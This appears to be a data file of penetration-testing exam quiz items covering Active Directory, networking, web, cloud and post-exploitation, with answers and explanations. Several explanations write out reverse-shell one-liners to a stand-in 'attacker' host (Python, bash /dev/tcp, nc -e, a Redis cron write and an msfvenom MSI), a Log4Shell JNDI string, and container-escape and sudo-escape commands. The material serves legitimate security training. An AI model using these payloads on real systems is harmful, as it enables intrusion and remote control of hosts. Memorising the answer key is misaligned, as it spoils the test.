    {id:"2-51",domain:"ActiveDirectory",q:"PowerView 'Get-NetGPOGroup' is used. What does it enumerate and why is it useful for privilege escalation?",opts:["All GPO-linked security groups and permissions on SYSVOL","Groups granted local administrator rights on computers via Group Policy; identifies non-admin users with local admin access to specific machines","All service accounts with SPNs registered in AD","Domain-joined computers with unconstrained Kerberos delegation"],ans:1,exp:"Get-NetGPOGroup/Get-GPOLocalGroup enumerates GPOs that define local group memberships (Restricted Groups and Groups.xml GPO settings). This reveals which domain users/groups have been granted local admin rights on which computers via Group Policy — an alternative path to local admin on specific machines without needing domain admin privileges."},
    {id:"2-52",domain:"ActiveDirectory",q:"'Everyone' has WriteDACL on the domain root object. What attack does this enable?",opts:["Any user can read all AD objects since WriteDACL implies read access","Any user can modify the ACL on the domain root to grant themselves DCSync rights, then perform DCSync to extract all domain hashes","WriteDACL on domain root only affects non-privileged objects; protected groups are exempt","Any user can create new OUs and GPOs but not modify existing permissions"],ans:1,exp:"WriteDACL on the domain root object = any user can modify the domain root's ACL. By granting themselves 'Replicating Directory Changes' and 'Replicating Directory Changes All', they can then perform DCSync and extract all domain hashes including KRBTGT (for golden tickets) and Domain Admin accounts. Critical misconfiguration enabling full domain compromise."},
    {id:"2-53",domain:"ActiveDirectory",q:"Kerberos traffic: AS-REQ without pre-authentication followed by AS-REP. Which attack does this enable?",opts:["Kerberoasting via offline cracking of a TGS ticket from subsequent TGS-REQ","AS-REP roasting: extracting and cracking the encrypted session key in the AS-REP to recover the user's password","Pass-the-ticket using TGT extracted from AS-REP","Golden ticket using KRBTGT hash embedded in AS-REP"],ans:1,exp:"AS-REQ without pre-authentication = the user has pre-auth disabled. The KDC responds with AS-REP containing a session key encrypted with the user's password-derived key. This encrypted blob is extractable without being authenticated and crackable offline (hashcat -m 18200). Kerberoasting requires an authenticated TGS-REQ — a different attack requiring domain credentials."},
    {id:"2-54",domain:"ActiveDirectory",q:"Computer has TrustedForDelegation=TRUE (unconstrained). Administrator connects to this machine. What does the attacker gain?",opts:["The administrator's password hash from LSASS memory","A copy of the administrator's TGT is cached in the machine's LSASS; attacker can extract and impersonate the administrator to ANY service in the domain","The administrator's NTDS.dit credentials are synchronised to the machine","Administrator's Kerberos service tickets are visible in the machine's credential cache"],ans:1,exp:"Unconstrained delegation: when a user authenticates to a service with this flag, the KDC includes a copy of the user's TGT in the TGS (Forwardable flag set). The machine receives and caches this TGT in LSASS. An attacker controlling this machine can extract the TGT with Mimikatz (sekurlsa::tickets) and use it to impersonate the user to ANY service — including the DC."},
    {id:"2-55",domain:"ActiveDirectory",q:"BloodHound edge 'ForceChangePassword' on a target user object. What does this allow?",opts:["Read the target user's current password hash","Reset the target user's password WITHOUT knowing the current password, enabling account takeover","Lock the target user's account by setting the password to invalid characters","Disable the target user's account by setting password expiry to a past date"],ans:1,exp:"ForceChangePassword (ExtendedRight: User-Force-Change-Password) allows resetting a user's AD password without providing the current password. Use: net user <username> <newpassword> /domain, or PowerShell: Set-ADAccountPassword. Then authenticate as that user. Note: may invalidate existing encryption (EFS files) and break other password-derived keys."},
    {id:"2-56",domain:"Networking",q:"Subnet 10.10.20.0/28: how many total IPs and usable hosts?",opts:["32 total, 30 usable","16 total, 14 usable","14 total, 12 usable","8 total, 6 usable"],ans:1,exp:"/28 = 4 host bits. 2^4 = 16 total addresses. 16 - 2 (network + broadcast) = 14 usable hosts. Subnet mask: 255.255.255.240. For 10.10.20.0/28: range .0-.15, broadcast .15, usable .1-.14. Quick formula: usable = 2^(32-prefix) - 2."},
    {id:"2-57",domain:"Networking",q:"Traceroute shows hops 6-30 timing out after a boundary router at hop 5. Most likely explanation?",opts:["Target hosts are offline","Firewall/ACL at the boundary drops ICMP TTL-exceeded messages, making further hops invisible to traceroute","Routing table at hop 5 is corrupted causing loops","Target network uses RFC 1918 addresses incompatible with traceroute"],ans:1,exp:"Firewalls commonly block ICMP TTL-exceeded messages (type 11) which traceroute relies on. Beyond the firewall hop, traceroute shows nothing. This doesn't mean the target is unreachable — the intervening routers aren't generating ICMP TTL-exceeded replies. TCP traceroute (hping3 -T or nmap --traceroute) may penetrate further using allowed ports."},
    {id:"2-58",domain:"Networking",q:"MAC address 00:0C:29:XX:XX:XX seen in arp -a output. What does this OUI indicate?",opts:["Cisco Systems network device","VMware virtualised network interface","Dell server hardware","HP ProCurve network infrastructure"],ans:1,exp:"OUI (Organizationally Unique Identifier) 00:0C:29 is assigned to VMware, Inc. This indicates a VMware virtual machine. 00:50:56 is also VMware. Identifying VMware VMs is operationally useful — it helps understand the environment (virtual infrastructure, possible VMware vulnerabilities, vMotion, shared storage implications)."},
    {id:"2-59",domain:"Networking",q:"Service responds to SYN with SYN-ACK, three-way handshake completes, then immediately RST when any data is sent. Most likely explanation?",opts:["Service uses raw sockets rejecting TCP handshake","Network-level firewall completing TCP handshake (TCP proxy/stateful inspection) but dropping application-layer connection","Application crashed but OS maintains listening socket","Service requires TLS and rejects cleartext application data with RST"],ans:1,exp:"TCP proxy / transparent stateful firewall behaviour: the firewall answers the SYN/SYN-ACK to appear responsive, then when actual application data arrives, it determines the connection is blocked and sends RST. Common in load balancers and security proxies. The firewall is performing deep packet inspection — TCP connection is allowed but application payload is blocked."},
    {id:"2-60",domain:"Networking",q:"DNS zone transfer: 'dig axfr @ns1.target.com target.com' succeeds. Why is this significant?",opts:["Zone transfers expose the DNS server's administrative credentials","Reveals the complete internal DNS infrastructure: all hostnames, IPs, mail servers, and network topology — eliminating need for network scanning","Zone transfers allow modification of DNS records","Indicates DNS server vulnerable to cache poisoning"],ans:1,exp:"A successful zone transfer (AXFR) reveals the entire DNS zone: A/AAAA records (all hostnames and IPs), MX records, CNAME records, TXT records (SPF, DKIM), NS records, SRV records. This eliminates the need for network scanning — you have the complete map. Critical finding requiring immediate remediation."},
    {id:"2-61",domain:"Networking",q:"BGP misconfiguration: attacker announces 1.2.3.0/24 while legitimate owner has 1.2.0.0/16. What happens to traffic for 1.2.3.0/24?",opts:["Traffic load-balanced between legitimate and attacker routes","BGP longest-prefix match routes traffic to attacker's AS, enabling interception or blackholing","More specific route rejected since RFC 4271 prohibits /24 from untrusted peers","BGP ignores attacker's announcement since origin AS differs from registered owner"],ans:1,exp:"BGP longest-prefix match: more specific routes (/24 > /16) are preferred. An attacker who can announce 1.2.3.0/24 attracts all traffic destined for that /24. This is BGP hijacking — used for traffic interception, cryptocurrency theft (hijacking mining pool addresses), spam, or blackholing. RPKI (Resource Public Key Infrastructure) is the mitigation."},
    {id:"2-62",domain:"Networking",q:"Self-signed certificate on https://app.internal. Tester intercepts using Burp Suite. What attack is being performed?",opts:["SSL stripping downgrading to HTTP","TLS MITM: Burp presents its own certificate to the client and establishes a separate TLS session to the server, decrypting traffic in between","Certificate pinning bypass","HSTS bypass by intercepting before HSTS headers are cached"],ans:1,exp:"Burp Suite as a MITM proxy: Burp generates its own certificate (signed by Burp's root CA, which must be trusted by the browser). The browser's TLS terminates at Burp, which decrypts the traffic, inspects/modifies it, then re-encrypts it in a new TLS session to the real server. TLS interception / MITM. The user who accepted the self-signed cert already trusts non-standard CAs."},
    {id:"2-63",domain:"Web",q:"HSTS header with max-age=31536000. What does it prevent and what residual attack vector remains?",opts:["Prevents all MITM attacks; no residual vector exists","Prevents HTTP downgrade for the specified duration after first visit; residual attack: the initial connection (TOFU) before HSTS header is cached","Prevents certificate substitution by pinning the certificate","Prevents all XSS by enforcing HTTPS for all resource loads"],ans:1,exp:"HSTS instructs browsers to ONLY use HTTPS for the domain for max-age seconds. BUT: Trust On First Use (TOFU) — the FIRST time a user visits, if they've never seen the HSTS header, they can be MITM'd. HSTS Preloading (in browser preload lists) addresses TOFU by shipping HSTS entries with the browser. Also: subdomains require includeSubDomains."},
    {id:"2-64",domain:"Web",q:"OS command injection via 'find /uploads -name <input>' where 'test; id' returns user/group info. Which Python payload spawns a reverse shell?",opts:["python -c \"import pty; pty.spawn('/bin/bash')\"","python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"","Python payload uses Jinja2 __class__ traversal","Python payload reads /etc/passwd via file:// URI"],ans:1,exp:"OS command injection reverse shell: creates a socket, connects to attacker:4444, duplicates the socket's file descriptor to stdin (0), stdout (1), stderr (2), then spawns /bin/sh -i. This redirects all shell I/O through the socket. Alternative: bash -i >& /dev/tcp/attacker/4444 0>&1 (bash), nc -e /bin/sh attacker 4444 (netcat with -e flag)."},
    {id:"2-65",domain:"Web",q:"Nikto shows 'Server: Apache/2.2.14 (Ubuntu)'. What is the CORRECT next step before attempting exploits?",opts:["Immediately run the Apache 2.2.14 Metasploit module","Verify: check if the vulnerable module is loaded, if patches are backported by Ubuntu, and confirm exploitability in context","Run Nikto again with -evasion option","Use Shodan to find other instances to test exploits safely"],ans:1,exp:"Debian/Ubuntu routinely backport security fixes without changing version numbers. 'Apache/2.2.14' on Ubuntu may have all subsequent security patches applied while still reporting 2.2.14. Always check: dpkg -l apache2, apt-get changelog apache2, or the full Server header for patch indicators. Exploiting a patched system wastes time and causes unnecessary disruption."},
    {id:"2-66",domain:"Web",q:"What is the security assessment value of the robots.txt file?",opts:["Prevents automated scanners from finding the application","Instructs search engine crawlers which paths to exclude; these often reveal sensitive areas like /admin, /backup, /config that developers wanted hidden from search engines","Lists all valid URL paths providing a complete sitemap","Controls browser access to sensitive cookies via crawl-delay directive"],ans:1,exp:"robots.txt Disallow entries frequently reveal sensitive paths: /admin, /backup, /dev, /test, /staging, /internal, /config, /phpinfo.php. Developers add these to prevent search engine indexing, inadvertently advertising them to attackers. Always check robots.txt early in web app assessments. Also check: sitemap.xml, .well-known/, and archive.org for historical robots.txt entries."},
    {id:"2-67",domain:"Web",q:"Angular SPA making API calls to /api/v1/. Burp scanner finds no server-side injection on main page. Correct assessment approach?",opts:["Switch to Nikto since Burp can't assess Angular apps","Focus testing on API endpoints /api/v1/ using Burp Repeater and Intruder since all business logic is in the API layer","Decompile Angular JavaScript to find hardcoded credentials","Test only the Angular routing layer since API is assumed to be secured by the framework"],ans:1,exp:"Modern SPAs (Angular, React, Vue) serve static HTML/JS — the main page has no dynamic server-side logic. All business logic is in the REST/GraphQL API. Comprehensive testing requires: (1) proxy all API calls through Burp, (2) manually test each API endpoint for authentication, authorization, injection, and business logic flaws, (3) check for CORS misconfigurations."},
    {id:"2-68",domain:"Web",q:"Java source: 'String query = \"SELECT * FROM users WHERE id = \" + userId;'. What class of fix is required?",opts:["Input sanitisation by escaping single quotes","Replace with PreparedStatement: 'ps = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\"); ps.setInt(1, userId);'","Wrap in try-catch to prevent exceptions leaking to user","Implement a WAF rule to block SQL keywords in userId"],ans:1,exp:"String concatenation in SQL queries is the root cause of SQL injection. The ONLY correct fix is parameterised queries (PreparedStatements). The query structure is fixed at preparation time; user input is NEVER interpreted as SQL syntax. Input sanitisation and WAF rules are incomplete mitigations that can be bypassed. setInt() also provides implicit type validation."},
    {id:"2-69",domain:"Web",q:"'/download?file=report.pdf' returns 200 with report.pdf even when '/etc/passwd' is submitted. What server-side control is preventing traversal?",opts:["WAF blocks /etc/passwd specifically","Application maps filename to internal file ID and serves from restricted directory; requested filename is discarded and replaced with stored file","OS blocks read of /etc/passwd since web server runs as non-root","Web server URL-decodes the path traversal and blocks via blacklist"],ans:1,exp:"Indirect reference map / file abstraction: the application doesn't use the user-supplied filename to locate the file. It maps the filename to an internal ID, retrieves the file by ID from a restricted directory. The user-supplied 'file' parameter is used only for lookup, not as an actual filesystem path. This is the correct architectural pattern — don't use user input as filesystem paths."},
    {id:"2-70",domain:"Web",q:"Burp Suite reports 'HTTP Request Smuggling'. What does this exploit?",opts:["Inconsistent handling of HTTP methods between WAF and backend","Discrepancies in how frontend (proxy/load balancer) and backend parse Content-Length and Transfer-Encoding headers, allowing injection of requests into another user's session or bypass of security controls","Compression-based side-channel attacks exploiting shared TCP connections","Session token prediction based on HTTP request timing"],ans:1,exp:"HTTP Request Smuggling: exploits ambiguity between how front-end and back-end parse HTTP requests. When Content-Length and Transfer-Encoding conflict, each may consider different bytes as the 'end' of the request. An attacker 'smuggles' a partial request that gets prepended to the next user's request, poisoning it. Variants: CL.TE, TE.CL, TE.TE."},
    {id:"2-71",domain:"Web",q:"GraphQL endpoint with default introspection enabled. What should a tester do first?",opts:["Attempt DoS by sending deeply nested GraphQL queries","Use introspection to enumerate all types, queries, mutations, and arguments to understand the full attack surface; then craft targeted attacks","Disable introspection via the API to demonstrate the vulnerability","Submit invalid types to trigger server errors revealing framework version"],ans:1,exp:"GraphQL introspection reveals the complete API schema: all query/mutation types, field names, argument names and types, required fields. This enables targeted attacks on sensitive operations (e.g., updateUserRole, adminDeleteUser). Query: {__schema{types{name fields{name type{name}}}}}. Disable introspection in production environments."},
    {id:"2-72",domain:"Methodology",q:"UK Computer Misuse Act 1990 Section 1 creates an unauthorised access offence. What provides legal defence during a pentest?",opts:["The penetration tester's CREST certification","Written authorisation from the data controller or system owner documented in a signed rules of engagement or scope agreement","Verbal agreement with IT manager communicated via email","The penetration test contract between testing company and client"],ans:1,exp:"CMA 1990 s.1: unauthorised access to computer material. Defence: the access is AUTHORISED. Authorisation must come from someone with legal authority to grant it. It must be in writing (email at minimum, signed RoE preferred). The tester's certification doesn't provide authorisation — only the system owner can do that."},
    {id:"2-73",domain:"Methodology",q:"0-day found during engagement affecting systems beyond client scope. Correct responsible disclosure approach?",opts:["Publish vulnerability details immediately","Notify client, advise compensating controls, and follow coordinated disclosure: notify vendor privately, agree timeline, release details only after patch is available","Exploit further to document full impact before reporting","Notify CREST immediately as certifying body"],ans:1,exp:"Responsible/coordinated disclosure: (1) Notify the client immediately, (2) Privately notify the affected vendor with details and proposed disclosure timeline (typically 90 days — Google Project Zero standard), (3) Work with vendor on patch development, (4) Release publicly after a patch is available or timeline expires. Publishing immediately endangers all users."},
    {id:"2-74",domain:"Methodology",q:"RoE specifies 'no DoS testing without CTO sign-off'. DoS vulnerability found; CTO unavailable. Correct action?",opts:["Perform limited DoS test during off-hours","Document the theoretical DoS vector without exploiting it; note in report that exploitation not performed due to engagement constraints","Ask CISO for verbal approval","Perform DoS test; report and apologise afterward"],ans:1,exp:"Rules of Engagement are contractual and legal constraints. If a specific activity requires explicit written sign-off from a named individual and that person is unavailable, the activity CANNOT proceed. The finding is documented as theoretical. The report recommends the client arrange a subsequent authorised maintenance window for validation. Violating RoE terms invalidates the legal protection."},
    {id:"2-75",domain:"Methodology",q:"Critical RCE finding. Which risk rating framework element justifies a 'Critical' severity rating?",opts:["STRIDE threat model category: Spoofing","CVSS v3 Base Score: Attack Vector=Network, Privileges Required=None, User Interaction=None, Scope=Changed, C/I/A=High","OWASP Top 10 category A1: Injection","ISO 27001 control reference for network security"],ans:1,exp:"CVSS v3 for unauthenticated RCE: AV:N (network exploitable), AC:L (low complexity), PR:N (no privileges required), UI:N (no user interaction), S:C (scope changed — OS compromise), C:H/I:H/A:H = CVSS Score ~10.0 (Critical). CVSS is the standard scoring system referenced by CREST and most major vulnerability management frameworks."},
    {id:"2-76",domain:"Methodology",q:"Client requests pentest findings be shared with their parent company's security team. Agreement only covers the subsidiary. What should the tester do?",opts:["Share since parent company is responsible for group security","Obtain written consent from the client (subsidiary) before sharing with third parties not named in the original agreement","Redact sensitive technical details before sharing","Decline; CMA prohibits sharing engagement details with third parties"],ans:1,exp:"Confidentiality obligations: information obtained during an engagement is confidential to the contracting party. Sharing with any third party (even the parent company) requires explicit written consent from the client. The agreement should be amended to include the parent company, or a new NDA/disclosure agreement signed."},
    {id:"2-77",domain:"Post-Exploitation",q:"Windows host has 'Always Install Elevated' enabled in both HKLM and HKCU. What privilege escalation does this enable?",opts:["Any user can install services running as SYSTEM via SCM","Any user can install MSI packages with SYSTEM privileges; a malicious MSI installer executes code as SYSTEM","Current user can modify HKLM keys without UAC prompts","Any user can enable SeDebugPrivilege without admin approval"],ans:1,exp:"AlwaysInstallElevated: when both registry keys are set to 1, Windows Installer runs ALL .msi installations with SYSTEM privileges. Create a malicious MSI (msfvenom -p windows/x64/shell_reverse_tcp -f msi > payload.msi) and run it: msiexec /quiet /qn /i payload.msi. Shell arrives as SYSTEM."},
    {id:"2-78",domain:"Unix",q:"sudoers entry: 'www-data ALL=(ALL) NOPASSWD: /usr/bin/vim'. Which GTFOBin achieves root shell?",opts:["sudo vim -c ':!/bin/bash' to spawn a shell with sudo privileges","sudo vim /etc/sudoers to modify the file and add www-data to root group","Run sudo vim and use file manager to browse to /etc/shadow","Use sudo vim to edit /etc/passwd and add a new root-level user"],ans:0,exp:"Vim GTFOBin for sudo: 'sudo vim -c \":!/bin/bash\"' or 'sudo vim' then ':set shell=/bin/bash' and ':shell'. Vim's :! command runs OS commands. Since vim is run with sudo, the shell spawns as root. Alternative: sudo vim -c ':py import os; os.execl(\"/bin/sh\",\"sh\",\"-c\",\"reset; exec sh\")'. GTFOBins.github.io documents escape techniques for 100+ binaries."},
    {id:"2-79",domain:"Networking",q:"tcpdump captures traffic on port 23 with cleartext credentials visible in the TCP stream. What protocol is this?",opts:["SSH with a broken encryption implementation","Telnet; transmits all data including authentication credentials in cleartext over TCP 23","rlogin using TCP 23 in compatibility mode","HTTP basic auth downgraded to port 23 by a misconfigured proxy"],ans:1,exp:"TCP port 23 = Telnet. Telnet was the primary remote administration protocol before SSH but transmits EVERYTHING (including authentication) in cleartext. Capturing 'Password:' followed by the actual password string in a Wireshark TCP stream on port 23 is a classic Telnet credential capture. SSH was designed as an encrypted replacement for Telnet."},
    {id:"2-80",domain:"Post-Exploitation",q:"NTLMv2 hashes captured. Hashcat fails to crack after 24 hours. What alternative attack leverages captured hashes WITHOUT cracking?",opts:["Pass-the-hash using NTLMv2 hash directly","NTLM relay attack: relay captured authentication to another service in real-time, authenticating as victim without knowing their password","Kerberoasting using the NTLMv2 hash to derive a service ticket","Session hijacking using NTLMv2 hash to predict session key"],ans:1,exp:"Net-NTLMv2 hashes (captured by Responder) CANNOT be passed directly — unlike NTLM hashes (SAM dump), Net-NTLMv2 includes a challenge and is session-specific. However, NTLM relay works in real-time: when a Windows client sends NTLMv2 authentication, relay it to another service (LDAP, SMB, HTTP, MSSQL) to authenticate as the victim. Use ntlmrelayx.py."},
    {id:"2-81",domain:"Networking",q:"802.1X port-based NAC on wired network. Tester bypasses using an IP phone as pass-through. What technique?",opts:["ARP spoofing to impersonate the authenticated IP phone MAC","MAC spoofing/NAC bypass: 802.1X authenticates the IP phone; by connecting through the phone's switch port, tester's device inherits the authenticated session","Evil twin attack impersonating corporate wireless AP","802.1Q VLAN hopping through the IP phone's trunk port"],ans:1,exp:"Cisco IP phones have a built-in 2-port switch: one port to the wall (uplink to corporate switch) and one port to a PC. The 802.1X authentication of the phone authenticates the port, and many deployments pass-through the PC's traffic on the voice/data VLAN without re-authenticating. By connecting to the PC port, traffic is bridged through the authenticated phone connection."},
    {id:"2-82",domain:"Networking",q:"Internal service at 10.10.10.50:8080 accessible only from a compromised host. Which SSH command creates the appropriate local forward?",opts:["ssh -L 8080:10.10.10.50:8080 user@compromised_host","ssh -R 8080:10.10.10.50:8080 user@compromised_host","ssh -D 8080 user@compromised_host","ssh -N -f user@compromised_host"],ans:0,exp:"SSH -L <local_port>:<remote_host>:<remote_port> <ssh_server>: creates a LOCAL forward. The attacker's machine listens on port 8080; connections are forwarded through the SSH tunnel to the compromised host, which then connects to 10.10.10.50:8080. -R creates a REMOTE (reverse) tunnel. -D creates a SOCKS proxy. After running: http://localhost:8080 on attacker reaches the internal service."},
    {id:"2-83",domain:"Windows",q:"UAC set to 'Always Notify'. Which bypass technique is rendered ineffective compared to default settings?",opts:["DLL hijacking in system directories","Auto-elevation COM object abuse (fodhelper, eventvwr) bypasses are blocked since ALL elevation triggers a UAC prompt with 'Always Notify'","Token impersonation via SeImpersonatePrivilege","Pass-the-hash attacks since 'Always Notify' enforces NTLMv2"],ans:1,exp:"'Always Notify' requires a UAC prompt for ALL elevation attempts — including binaries with autoElevate=true in their manifests (which is what fodhelper, eventvwr, cmstp bypasses exploit). With default UAC, these auto-elevate silently. With 'Always Notify', the user sees every elevation request, blocking auto-elevation UAC bypasses. Token manipulation with existing elevated tokens is unaffected."},
    {id:"2-84",domain:"Post-Exploitation",q:"C2 framework uses DNS-over-HTTPS (DoH) for C2 communication. What detection evasion benefit does this provide?",opts:["DoH bypasses all network monitoring since it uses port 443 which organisations cannot block","Traditional DNS monitoring cannot inspect DoH traffic (encrypted HTTPS to a DoH resolver); DNS-based C2 detection is bypassed since DNS queries are not visible on the wire","DoH automatically encrypts payload with AES-256 preventing all network-based detection","DoH C2 traffic is indistinguishable from normal HTTPS traffic to any commercial sandbox"],ans:1,exp:"DNS over HTTPS: DNS queries are encapsulated in HTTPS (port 443) to a DoH resolver. Traditional DNS monitoring (inspecting port 53 traffic, passive DNS logging on the resolver) sees nothing. DoH defenders must: monitor DoH resolver usage via HTTPS inspection, use DNS firewall that intercepts DoH, or use MDM to force device DNS settings."},
    {id:"2-85",domain:"Web",q:"WAF is blocking SQL injection. Payload used: 'SEL/**/ECT/**/ 1,2,3/**/FR/**/OM/**/users'. What WAF bypass technique?",opts:["URL encoding of reserved SQL characters","Inline comment insertion (/**/) to break SQL keywords while maintaining MySQL/MSSQL syntactic validity; some WAFs fail to handle fragmented keywords","Case variation (SeLeCt) to bypass case-sensitive WAF rules","HTTP parameter pollution to split SQL payload across multiple parameter values"],ans:1,exp:"MySQL and MSSQL parse SQL comments (/**/) as whitespace within keywords: SEL/**/ECT = SELECT in MySQL. WAFs that tokenise 'SELECT' as a keyword may fail to match 'SEL/**/ECT'. Other WAF bypass techniques: URL encoding (%53%45%4C%45%43%54), double URL encoding, Unicode encoding, HTTP parameter pollution, chunked transfer encoding fragmentation."},
    {id:"2-86",domain:"Networking",q:"Internal network host with open port 5985. What service and what attack capability?",opts:["SMB alternative port; same capabilities as port 445","WinRM/PowerShell Remoting; with valid credentials provides interactive PowerShell sessions, command execution, and file transfer similar to SSH","RDP alternative port; provides full graphical remote desktop","LDAP alternative port for AD queries when 389 is filtered"],ans:1,exp:"TCP 5985 = HTTP WinRM (Windows Remote Management) / PowerShell Remoting. TCP 5986 = HTTPS WinRM. WinRM enables: Enter-PSSession for interactive remote PowerShell, Invoke-Command for remote script execution, WMI operations, file transfer. With valid credentials: evil-winrm (Linux tool), or PowerShell's Enter-PSSession. Similar capability to SSH for Windows management."},
    {id:"2-87",domain:"Web",q:"GraphQL query: '{__schema{types{name fields{name}}}}'. What does a successful response provide?",opts:["Performs DoS by overloading the schema resolver","Enumerates the complete GraphQL schema including all type definitions and field names, revealing the full data model and sensitive query targets","Extracts all data from the database via __schema meta-field","Identifies deprecated fields with reduced security controls"],ans:1,exp:"GraphQL introspection: __schema is the root meta-field. Querying it returns all defined types (User, Product, Order, AdminPanel, etc.) and their fields. This reveals: sensitive types that shouldn't exist (InternalConfig, DebugInfo), field names like 'password', 'secretKey', 'adminOverride'. It's the GraphQL equivalent of reading the full API specification."},
    {id:"2-88",domain:"Networking",q:"802.11w (PMF) enabled network. Deauthentication frame injection attempted. Clients don't disconnect. Why?",opts:["Wireless card doesn't support 802.11n required for deauth injection","802.11w mandates cryptographic protection of management frames including deauth; spoofed deauth frames without proper MIC are discarded","Deauthentication attack requires Beacon frame flood first","WPA3 is required for PMF to function; WPA2 networks remain vulnerable"],ans:1,exp:"802.11w (Protected Management Frames / PMF): management frames (deauthentication, disassociation, action frames) are cryptographically protected with a Message Integrity Code (MIC). Spoofed deauth frames from an attacker (without the proper MIC derived from the PTK/IGTK) are discarded by both the AP and clients. Enabled in WPA2 (optional/required) and mandatory in WPA3."},
    {id:"2-89",domain:"Web",q:"'admin.oldcompany.com' CNAME points to a decommissioned Azure website (404 from Azure). Correct next step for subdomain takeover?",opts:["Report immediately as high severity without further testing","Verify the CNAME target is unclaimed: check if the Azure subdomain is available for registration; if so, register it and host a PoC page to demonstrate content under admin.oldcompany.com","Perform DNS zone transfer to enumerate other vulnerable subdomains","Use subdomain to deliver phishing payload against client employees"],ans:1,exp:"Subdomain takeover proof of concept: (1) Confirm CNAME points to unclaimed resource (Azure App Service hostname not registered), (2) Register/claim the resource on the cloud provider, (3) Host innocuous content proving control (e.g., a simple HTML page with a unique ID). This PROVES the risk without causing harm. Do NOT deliver actual malicious content."},
    {id:"2-90",domain:"Post-Exploitation",q:"Kubernetes cluster with exposed API server (port 6443). Default service account token mounted in a pod. 'kubectl auth can-i --list' reveals what?",opts:["The cluster's entire RBAC policy","The permissions of the current service account's role binding within the namespace, revealing what API operations the pod's service account can perform","All other service accounts in the cluster","The Kubernetes version and applicable CVEs"],ans:1,exp:"kubectl auth can-i --list uses the mounted service account token to query the Kubernetes API server about the current account's permissions. It lists every resource/verb combination the service account is authorised for. If the default service account has excessive permissions (cluster-admin, create pods, etc.), this enables privilege escalation within the cluster."},
    {id:"2-91",domain:"Post-Exploitation",q:"AWS EC2 with IMDSv1 enabled and SSRF in hosted application. What is accessible via http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>?",opts:["IAM role's ARN and attached policy documents","Temporary AWS credentials (AccessKeyId, SecretAccessKey, Token) valid for the role assumption duration, allowing AWS API calls with EC2 instance's IAM permissions","The EC2 instance's SSH private key for the configured key pair","AWS account ID and IAM role trust policy"],ans:1,exp:"AWS IMDSv1 metadata endpoint returns temporary STS credentials for the EC2 instance role: AccessKeyId, SecretAccessKey, Token, Expiration. These are temporary but rotated automatically. With these credentials you can make AWS API calls with the instance's IAM permissions: if the role has S3:GetObject, read all S3 buckets; if AdministratorAccess, full AWS account takeover."},
    {id:"2-92",domain:"Post-Exploitation",q:"Container compromised. Docker socket (/var/run/docker.sock) is mounted inside. What is the impact?",opts:["Can communicate with other containers on the same bridge network","Docker socket = full control of Docker daemon; can create privileged container with host filesystem mounted, achieving complete host compromise and container escape","Docker socket only allows read access to container logs","Docker socket enables communication with Kubernetes orchestrator only"],ans:1,exp:"The Docker socket is the control plane for Docker daemon. With /var/run/docker.sock access from inside a container: docker run -v /:/host --privileged -it ubuntu chroot /host — mounts the host filesystem and escapes the container. Any operation available to the Docker daemon is available: create privileged containers, read host filesystem, load kernel modules."},
    {id:"2-93",domain:"Methodology",q:"MongoDB on port 27017 without authentication storing customer PII. Under GDPR, what is the organisation's obligation (no confirmed breach)?",opts:["Notify ICO within 72 hours since exposed data constitutes a reportable breach","A vulnerability alone without confirmed exploitation does not trigger GDPR breach notification; organisation must remediate promptly and assess if unauthorised access occurred; internal documentation is necessary","Notify all data subjects whose data was potentially exposed within 30 days","GDPR only applies to EU organisations; UK post-Brexit has different notification thresholds"],ans:1,exp:"GDPR Article 33: notification to supervisory authority is required for personal data breaches (unauthorised access, acquisition, etc.). A misconfiguration (exposed but not necessarily accessed) is a near-miss/vulnerability. The organisation must: assess whether access occurred, document the near-miss, remediate immediately, implement access controls. If evidence of unauthorised access: notify ICO within 72 hours."},
    {id:"2-94",domain:"Web",q:"JNDI injection: '${jndi:ldap://attacker.com/payload}' submitted. What does JNDI lookup enable in vulnerable Java versions?",opts:["JNDI queries the attacker's LDAP server for text data only; no code execution possible","Vulnerable application connects to attacker's LDAP server which returns a serialized Java object; JVM instantiates the class, executing attacker-controlled code","JNDI injection only enables SSRF by causing outbound connections; no code execution possible","LDAP response replaces the log message with attacker-controlled text, enabling log injection"],ans:1,exp:"Log4Shell (CVE-2021-44228): Log4j2's JNDI lookup processes ${jndi:ldap://...} in log messages. The JVM connects to the LDAP server. The LDAP server returns a reference to a remote Java class. The JVM loads and instantiates the class — executing attacker-controlled code. Affects Log4j2 versions before 2.15.0."},
    {id:"2-95",domain:"Post-Exploitation",q:"Unauthenticated Redis on TCP 6379. How to achieve OS-level code execution?",opts:["Redis CONFIG SET to modify running configuration to enable RCE","Redis CONFIG SET dir and dbfilename to write a cron job or SSH authorized_keys via SAVE, then wait for execution","Redis EVAL with Lua script calling OS system functions","Redis SLAVEOF to receive malicious RDB data containing shellcode"],ans:1,exp:"Redis RCE via filesystem writes: CONFIG SET dir /var/spool/cron/ sets the RDB save directory. CONFIG SET dbfilename root makes the RDB filename 'root'. Then: SET payload '\\n\\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n\\n' and BGSAVE saves this as a 'cron file' in /var/spool/cron/root. The cron daemon executes the reverse shell. Similar technique for authorized_keys."},
    {id:"2-96",domain:"Networking",q:"802.1Q VLAN hopping via double-tagging. What specific switch configuration makes this possible?",opts:["Switch uses 802.1Q trunking on all ports including access ports","Attacker's port is configured as an access port on the same VLAN as the switch's native VLAN (VLAN 1); the double-tagged frame bypasses VLAN isolation when outer tag matches native VLAN","VLAN hopping requires the attacker to be in the same broadcast domain as the target VLAN","Switch doesn't support 802.3ad link aggregation allowing VLAN ID manipulation"],ans:1,exp:"Double-tagging VLAN hopping: requires the attacker to be on the NATIVE VLAN (usually VLAN 1). Attacker sends a frame with two 802.1Q tags: outer tag = native VLAN ID (1), inner tag = target VLAN (e.g., VLAN 100). Switch 1 strips the outer tag (native VLAN, untagged), forwards to trunk. Switch 2 sees inner tag = VLAN 100 and delivers to target VLAN. Only works sender-to-victim (unidirectional)."},
